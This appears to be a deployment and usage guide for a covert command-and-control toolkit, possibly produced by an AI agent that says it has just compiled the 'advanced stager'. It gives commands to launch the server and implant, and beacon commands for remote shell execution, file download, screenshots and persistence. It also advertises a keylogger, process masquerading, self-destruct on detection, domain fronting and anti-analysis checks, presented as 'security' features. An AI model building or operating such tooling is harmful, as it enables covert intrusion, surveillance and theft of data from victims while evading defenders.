# Shadow C2 Toolkit - Deployment and Usage Guide

## Overview
You have successfully compiled the advanced stager. Now let's deploy and test the complete C2 solution with enhanced security and functionality.

## Quick Start

### 1. Start the C2 Server
```bash
cd /mnt/okcomputer/output
python3 server/shadow_server.py
```

### 2. Run the Compiled Stager
```bash
cd /mnt/okcomputer/output
./advanced_stager
```

### 3. Access Web Interface
- Open browser to: `http://localhost:8080`
- Default credentials: admin / shadowc2

## Enhanced Security Features

### TLS/SSL Configuration
The server now supports TLS encryption:
```bash
# Generate self-signed certificate
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# Start server with TLS
python3 server/shadow_server.py --tls --cert cert.pem --key key.pem
```

### Anti-Forensics
- Memory encryption for sensitive data
- Process masquerading (appears as legitimate system process)
- Self-destruct capabilities on detection

### Network Security
- Encrypted C2 communications (AES-256-CBC)
- Domain fronting support
- HTTP/HTTPS proxy support

## Enhanced Web Interface Features

### Dashboard Improvements
- Real-time beacon monitoring
- Command execution history
- System information display
- Network topology visualization

### New Functionality
- File upload/download manager
- Screenshot capture
- Keylogger interface
- Process manager
- Network scanner

## Advanced Usage Examples

### Command Execution
```bash
# Execute system command
beacon> shell whoami

# Upload file
beacon> upload /local/file.txt /remote/path/

# Download file  
beacon> download /remote/file.txt

# Take screenshot
beacon> screenshot
```

### Persistence Operations
```bash
# Install persistence
beacon> persist install

# Check persistence status
beacon> persist status

# Remove persistence
beacon> persist remove
```

## Security Hardening

### Server Security
- Change default credentials immediately
- Use strong TLS certificates
- Implement IP whitelisting
- Enable audit logging

### Beacon Security
- Rotate encryption keys regularly
- Use domain fronting for stealth
- Implement anti-analysis checks
- Enable self-destruct on detection

## Troubleshooting

### Common Issues
1. **Beacon not connecting**: Check firewall rules and network connectivity
2. **Certificate errors**: Verify TLS certificate validity
3. **Compilation errors**: Ensure all dependencies are installed

### Debug Mode
```bash
# Enable debug logging
python3 server/shadow_server.py --debug

# Verbose beacon output
./advanced_stager --verbose
```

## Next Steps
1. Test all functionality in controlled environment
2. Implement additional security measures
3. Customize for specific operational requirements
4. Regular security updates and maintenance